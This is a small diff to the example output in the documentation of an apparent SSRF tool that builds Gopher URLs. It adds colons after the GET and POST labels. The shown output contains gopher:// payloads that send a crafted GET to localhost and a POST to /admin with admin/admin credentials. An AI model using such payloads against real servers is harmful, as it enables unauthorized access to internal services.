@@ -19,7 +19,7 @@ Example output:
     
 [*] Please select GET (1) or POST (2) request: 1
 
-[x] Gopher GET Request
+[x] Gopher GET Request: 
 gopher://localhost:80/_GET%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0A
 
 [!] Happy Hacking ^_~
@@ -31,7 +31,7 @@ gopher://localhost:80/_GET%20/%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-
 
 [?] Informational: The four HTTP headers above are required for POST requests, namely POST, Host, Content-Type and Content-Length. If it is missing, an error will be reported, but GET does not use it.
 
-[x] Gopher POST Request
+[x] Gopher POST Request: 
 gopher://127.0.0.1:80/_POST%20/admin%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2029%0D%0A%0D%0Ausername%3Dadmin%26password%3Dadmin%0D%0A
 
 [!] Happy Hacking ^_~
